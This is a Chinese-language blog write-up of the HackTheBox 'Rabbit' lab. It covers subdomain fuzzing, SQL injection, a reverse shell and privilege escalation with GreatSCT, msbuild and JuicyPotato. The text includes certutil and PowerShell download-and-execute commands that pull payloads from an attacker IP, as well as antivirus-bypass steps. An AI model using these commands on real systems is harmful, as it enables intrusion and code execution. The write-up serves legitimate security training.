> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2JIfOXIKuleUG0n6MgMxqQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **74** 篇文章，本公众号会每日分享攻防渗透技术给大家。

  

靶机地址：https://www.hackthebox.eu/home/machines/profile/137

靶机难度：高级（无 / 10）

靶机发布日期：2018 年 10 月 25 日

靶机描述：

Rabbit is a fairly realistic machine which provides excellent practice for client-side attacks and web app enumeration. The large potential attack surface of the machine and lack of feedback for created payloads increases the difficulty of the machine.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/wucQH64lHvpOxUzKZzgrk8rOIbSiaoFokwT3HYichsCpM6ibw80Jw5WmZL4vQs947UAIP2l7bicjV6MJECFp51G6sQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/KjuGCOqDiaaNFtib6VJTMcniaaxmveDTOv0gxK5cXQIzqEMz4nucT2GzXGfSJfX6EoUEkmBoLvFFiaM0hRKjyFbpjQ/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_gif/SmicJrKFtALIWrz54cxp3O2ebjtPdQTG273RZmfK4JBv5drfB8QicSuSEDJBdrNh3FXWiceqaEhdqB2vjRED5JnBw/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvz4qgU8cOmysqFlhyTzxVRvcLyuWvUU0e4uh6HKDr71sONhW6eNZibgg/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.72....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpv51TVqrmO00KXmLbVJdJwc6UWtEqEAHqEsEak72joX2XaIiaLxyuV88g/640?wx_fmt=png)

Nmap 发现 80 端口开放着，版本 IIS/8.5，可以知道 Windows Server 2012 R2 上运行（可以 goole 搜索即可知道）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvm9Ed8vgrvcG0psZ1fwicNVg4trX70RV6KmddyqAW5SAPSZic6yxD8eMg/640?wx_fmt=png)

这是拳皇...

这里找到了域名...streetfighterclub.htb，还让我们去找到下一个链接... 先添加到 hosts 中

利用 gobuster 和 dirb 爆破域名... 没发现任何信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvGtYTZdXMSZq6ibGmrcyoPHicDF4KfmZJlYswx7Tq4ERV2HVpKrp4sh1A/640?wx_fmt=png)

```
wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb" --hw 717
```

这里利用 wfuzz 进行域名爆破，发现了底下有 members 子域名，一般信息收集真实域名如果发现不了，去尝试发现子域名，会有意外收获...

这里把 members.streetfighterclub.htb 加入到 hots 中即可... 继续爆破...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvbjbjlDSZke7pIXsWBuTYMHp90a1mxndt7IUskRI27Q7qbkjsyMhsmA/640?wx_fmt=png)

```
gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://members.streetfighterclub.htb -o dayu.log
```

可以看到子域名爆破发现了有用的目录...old

这里前面知道运行的是 IIS，存在 asp 文件，继续针对进行爆破...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvLNVWwCicquyEuBStflW2rrDafxGNs6Ldm9ER57uBP7KoTEEr8hlicn4A/640?wx_fmt=png)

```
gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://members.streetfighterclub.htb/old -X .asp
```

可以看到发现了 login.asp...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvYW4Q06k6FiaE5m8jmXicVjsUhTRBKmYQr9zRwXUwEK7T6FMQEjiczZtNA/640?wx_fmt=png)

可以看到这是一个登陆界面... 测试了默认密码都无法登陆，这边进行 sql 注入分析...

这里利用 burpsuit 进行分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvDqg4T9XSnRicnNy1wpe9kCtAfr7tiamgzy2ujmOTjZ6NhrdO9OGmhuEg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvcNwibGxXH1WyvFbeLhYDK3A4oXRyHjYY9XU3iaicbBtaWTkGwqWUicHxbg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvV2KiaS7ylug6TlZGWbiaibo1jfGG9p8JjYBMQ0M6u0uuE1oO1WnDrYbrw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpv75nibAVeDtSOmFAHcNKB5vAe03ia34rX3kXjgHKuXf2qwXPAZ6fLShQg/640?wx_fmt=png)

经过初步分析，两个 type 中 administrator 和 User 的类型都是一致的，都是 2017 字节... 这里我就随意用一个分析即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvwcGjbNJkLAFhq47jAtG5q6Atib6gO4j12LtGHxWY7bKRm2ITxfjcIYw/640?wx_fmt=png)

这里已经测试过了 admin 和 passwd 的注入，都无法注入... 这里尝试在 type 发现了 500 的错误... 这里有错误肯定有正确，找到反对注入点即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvBObAxkhWMMDFGRhOV33vZCmpTeAwiaFzgnmYibzTrcEkMgWibRwrPRSOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpv9MnGc3kNdTrqTtcfuKviaubRvYWpRWza8mn6lJWzSfVWKCw28RN1RPw/640?wx_fmt=png)

可以看到存在注入点，符号加英文是返回 302，英文加任何都是 500 回复... 利用 sql 注入方法开始注入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvVnTD9IvKpwAv4DXLibdffmweiars9icJCw7MAmx6vXwA5CsMib0Efcsuuw/640?wx_fmt=png)

仔细可以看到，SQL 注入回复了一封 email....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvGxLalCp54ROR7UvIkxC0ibDHjroBdcE8PegdeSZnXejtYKZAZphb50A/640?wx_fmt=png)

找到了个电子邮件...

这里知道注入点可以找到对方的内容信息... 那只要提交个 shell 即可提权？？？

这里经过了大神的文章...

```
[参考链接](https://www.tarlogic.com/en/blog/red-team-tales-0x01/)
```

利用 sql 获得 REC...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvictibE7pyTaCALuNkWUDXXkjMZsDDQELqpt03erlCYtLRMV7wcrZtQHw/640?wx_fmt=png)

这里命令需要的私聊我，弄了几个小时... 收获非常多... 注入

可以看到成功获得低权用户... 反向外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpv82RDj1tJDzgpib9Ifrd9aPYQS0ficjDMnOSLd4XOuG1GWByRXqonaa0Q/640?wx_fmt=png)

打了挺多补丁的...159 个...（牛逼）

在此用户上，不能查看 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvtft8FlcfG6PtW2Jibx5cvHk6cD9oV2vjwpzhX13tFN8ibCP0icbB4Pd7Q/640?wx_fmt=png)

可以看到防火墙已经开放了 80 端口...

尝试用了 MSF 的 EXE 提权，和 shell 提权都没办法，防火墙阻碍了...

这边需要绕过防火墙，或者加入白名单等方式，进行提权了...

![](https://mmbiz.qpic.cn/mmbiz_gif/91VlKjK1jgxkKJILyJj2LWD0PYmzSuXEq9Fic10RiaJK5dicRJKowHM8vaibCbeoaC3hW64rtu7FrV8yJx7MkRvszw/640?wx_fmt=gif)

方法 1：

![](https://mmbiz.qpic.cn/mmbiz_gif/sh14FEsstk64OiaHia2vXhZV1ckaMlfcgPj9vItaVmmUx5waCVlhrA1UaJR1DHpkmAdw2jESWs8tSFkjllJqibYsA/640?wx_fmt=gif)

GreatSCT 利用这个工具进行防病毒... 这里需要下载 steup（在文件中带了，./setup -c 即可下载相关组件）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpv18hhc2PzsbMIBheHcFQiaGvT3iaSMLPA7xs1R0iat005X86V1Pkibpy9Kw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvw0IZmzgx2nHXUwHmsxHShAibs9gbBWZLudqdzmeF9RJEHUYOJLzxPuA/640?wx_fmt=png)

```
./GreatSCT.py
```

运行后，开始利用工具，里面很多 exploit 都是可以绕过各种防火墙的 shell... 这里生成即可...use Bypass 选择绕过的意思...

这里不懂得可以看我前面截图得 help...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvMwuFydZM4FSjRKOZI6d4yF0qMNPW9DjW3PNUk9IZlYic1Z8hLPfpSaQ/640?wx_fmt=png)

list 选择 payload...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvtNtHXW8GSnV2SAZA7ssJq9xMGibP8XHiaIAsF0EgvSAu50d56wOvY59Q/640?wx_fmt=png)

可以看到，这里选择 https 得 payload...（q 返回上一层）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpviaiah3xX95gDW9icOnJyiaich3AgvI7nOMhUZ5HbSfdtDEcAeuwbECRYlGA/640?wx_fmt=png)

选择刚利用得 payload 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvl2OsP9yPIIOWurhyclTXY4Sp38mPicjTQm4uicD9P4AAmE4QemJiaVD6g/640?wx_fmt=png)

这里填写反向 shell 回来指向本地 IP 即可... 然后 generate 执行产生有效载荷...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvgiarKgLnvJov4S5biadicSxlIEn4x1JUPC0iaReHUwu9zNleg78H9MVF0g/640?wx_fmt=png)

执行完 generate 后，直接输入 dayushell 即可..（名称）

然后会生成 shellcode... 这里直接利用 dayushell.xml 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvegXX0quE8f3dCicrJKc62jvp7fhJicibQ7qWCrJ1qnG03nCzhzPGsqrZw/640?wx_fmt=png)

```
certutil.exe -urlcache -split -f http://10.10.14.11/dayushell.xml dayushell.xml
```

本地开启 80 服务上传文件，成功利用 windows 上带得 certutil 上传了 shellcode...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvicjsxGgTQUaRaYK0dGYu6zd2xgn5QrgBAksoHjQ6cU9FDIicjHA6gTrw/640?wx_fmt=png)

这里利用 MSF 来进行监听... 选择 https.. 端口选择和 shellcode 一致即可...

这里要利用 windows 自带得 msbuild.exe 进行白名单方式绕过执行. xml 得 shellcode 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvzj3RAZHV23HNFmYY0LknGQ4Ly5msicl6fLVhWibNC3x4XMbibtIh0rmbg/640?wx_fmt=png)

msbuild.exe 存放的路径搜索都能知道...

开始提权...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvhMsfR4ZvUeyZtkSfKFSh0MIiavF7bb3X9uYskS71lTdDVVCPXEtRAcw/640?wx_fmt=png)

可以看到，是可以提权的，但是利用 MSF 也无法获取反向 shell 的数据包...

不知道是 exploit 错了，还是 GreatSCT 有生成的包有问题... 这里按照思路尝试了挺久，没成功，应该是 exp 有问题... 大家看到这里的可以尝试下...

![](https://mmbiz.qpic.cn/mmbiz_gif/91VlKjK1jgxkKJILyJj2LWD0PYmzSuXEq9Fic10RiaJK5dicRJKowHM8vaibCbeoaC3hW64rtu7FrV8yJx7MkRvszw/640?wx_fmt=gif)

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_gif/sh14FEsstk64OiaHia2vXhZV1ckaMlfcgPj9vItaVmmUx5waCVlhrA1UaJR1DHpkmAdw2jESWs8tSFkjllJqibYsA/640?wx_fmt=gif)

```
https://github.com/ohpe/juicy-potato
```

利用土豆进行绕过防火墙提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpv0XTIlxHm9NNrBoRFFDAmcFe4XGHJIVUic59QSqkPQ5YLpPgfZX1RUkw/640?wx_fmt=png)

下载到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpv6zTzianUjenQoLSicOqX0YjOsLeSUhwzico5TyUJPtaohxgBSSloTVIbA/640?wx_fmt=png)

上传即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvRodyoWbHHA7mub2LHhnJNSgEkRib7vHiaV9UOgiaDGbXvbo9m1YBwWPjg/640?wx_fmt=png)

随意拿一个文件执行，可以看到需要得条件挺多，条件允许得情况才可提权... 开始把

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvZHN0Zcib83XsSxXElMfUicvx7VPavtbWDroI6lV9O4VerScZrwLyxmEw/640?wx_fmt=png)

这里需要一个 shell... 利用 nishang 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvusNKHY82ZIehHeag1zWZQWc6XJL4qPQMCC48HicJgGmdicdMTu4MQGxQ/640?wx_fmt=png)

```
cmd /c "echo powershell iex(new-object net.webclient).downloadstring(''http://10.10.14.11/dayu'') >shell.bat"
```

写一个 Bat... 利用 powershell 上传 shellcode.... 现在只差 CLSID 了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvwfhBpwGoOIicibRTibDrRpjUjxL4LMfT1JoMx7vic5bcODkA7Ff3OdrMsw/640?wx_fmt=png)

到这里找即可....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvzAa408w2W6NdF2RpEPcWQbHVZ5xVOJ57qsaJlDjMhqibmTsc7ht0Vyw/640?wx_fmt=png)

前面 Nmap 和低权 systeminfo 都可以看出系统信息... 选择 2012 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvRvhgCbYSwQPqdHUQF8QB6fKO8MLo05OQ59bQqVLMic7XvErGe6Oblibg/640?wx_fmt=png)

可以看到随意利用 CLSID 不对... 这里一个一个试即可... 版本所有得 CLSID 都在里面... 不多

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvB8PBjWZaG7Uqw7g1Kq2D7mLn3PdFXFWTWEiax77sLvgBBsgceRQgcfQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpv7ee1b2e0y4AgHFus5AoQ0fnFyB7oeibOgqChDIVoN5aa8zG54RVHWwQ/640?wx_fmt=png)

```
C:\windows\system32\spool\drivers\color\JuicyPotato.exe -p shell.bat -t * -l 1337 -c '{8F5DF053-3013-4dd8-B5F4-88214E81C0CF}'
```

这里出了点问题，前面 CLSID 成功了，但是 80 却没上传 dayu 得 shellcode... 检查发现多打了两个点.... 看图即可...

可以看到成功提权... 这里通过 CLSID 方式绕过了防火墙防病毒模块...

![](https://mmbiz.qpic.cn/mmbiz_png/KjuGCOqDiaaNFtib6VJTMcniaaxmveDTOv0gxK5cXQIzqEMz4nucT2GzXGfSJfX6EoUEkmBoLvFFiaM0hRKjyFbpjQ/640?wx_fmt=png)

三、逆向工程

![](https://mmbiz.qpic.cn/mmbiz_gif/SmicJrKFtALIWrz54cxp3O2ebjtPdQTG273RZmfK4JBv5drfB8QicSuSEDJBdrNh3FXWiceqaEhdqB2vjRED5JnBw/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvIMxmYSOddqgmZz0HZv7vwiaXDRQlbwkKeFmkBfFcYkuewJT3g6hzReg/640?wx_fmt=png)

user 可以正常读取... 这里查看 root 信息还有个小坑...root

可以看到还存在着一个 checkdll.dll 文件... 可以利用它解析 root.exe 成 txt 文件，然后下载即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvI0gkPr9zlGBVeQj7nmjNCRFqSoTLIKSlqWTAcicZ1KL7uC9ibMmw98og/640?wx_fmt=png)

可以看到执行 root.exe 需要 passwd... 这里开始解析，下载下来...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvBf2qLxkQYcvb6I4icMWecj7vSbFtcJeT7ExA71VXM1sToVXd6c0vv4w/640?wx_fmt=png)

这里要逆向去分析 root.exe 了...GO

这边需要使用到 IDA 进行... 装了半天还是没装上，有人 kali 装了 IDA 的教我下... 但是我装在了电脑上.. 在 windows10 进行分析一样...

这里记得 checkdll.dll 也要下载，这两个是连带的... 不然无法逆向...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvicHpLSw5Mz0VJB9FhB8K4hiaDcUTjnv6iasphSjUHnozCoWvUXSfpYlcg/640?wx_fmt=png)

可以看到成功打开了，这已经不是我第一次玩逆向了... 开始

可以看到 root.exe 是基于 checkdll.dll 执行的，如果想分析打开 root.exe 只要去逆向解析 checkdll 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvibCUCMGaF9VJQiarATNL98Q8S63nNdxR8V1lsVA76LWCZPF43vT1pIibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpv6EkdNVVRDf7ic29ragLW9viaG5bP0sUbv8F73LCLdnzLUjP8HCyWlBjw/640?wx_fmt=png)

这里 shift+F12 可以弹出 string window 可以查看详细的插件汇编内容...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvBWDCPricP6tjGBBtafSIDTEBru0SSzIHfMUkGX7iaDhL9SByMFic2huYw/640?wx_fmt=png)

这里需要知道程序对变量 aFmFeholH 的字符是多少，点击 check+8 跳转到 Fm`fEhOl}h 去查看下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvIOW08C499qXJ0Dr4LZ7iaNECicd0EyC2Nh4JDEg8MXlJvj2bpP2kIrHA/640?wx_fmt=png)

这里可以看到 Fm`fEhOl}h 该函数对于 aFmFeholH 的 xor 每个字符是 9...

这里就好办了，直接写个简单 python 跑下即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvI2mRgibBaI0PFicj7rym2RCcId4KsyGPsjq0w6pkwdeiaRSiahKY3hfZfA/640?wx_fmt=png)

```
for i in "Fm`fEhOl}h":
    print(chr(ord(i) ^ ord('\x09')),end='')


print()
```

简单的命令跑下即可... 得到了密码 OdioLaFeta...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPznbQjiaiaFTDyKEmDTfrMpvj7oCB4icfKRTqgTlQfdYMdq6jRUqNNoicbmzSkVCicQGxY6IAfZoRia5bg/640?wx_fmt=png)

可以看到成功获得 root 信息....

  

从开始的信息收集域名爆破，到 burpsuit 分析 sql 注入点，到绕过防火墙提权，到利用 IDA 逆向解析. exe 程序...

学到挺多，做的过程很头疼，做完的感觉思路很清晰... 加油！！！

这里应该还有很多绕开 WAF、防火墙、防病毒模块等大神写的工具，或者方法，慢慢总结！

kali 还是没装成 IDA... 估计是环境问题...

GreatSCT 提权还是有问题...

希望会以上这两个的，私聊告知，感谢！

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了较困难靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/wucQH64lHvpOxUzKZzgrk8rOIbSiaoFokwT3HYichsCpM6ibw80Jw5WmZL4vQs947UAIP2l7bicjV6MJECFp51G6sQ/640?wx_fmt=gif)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)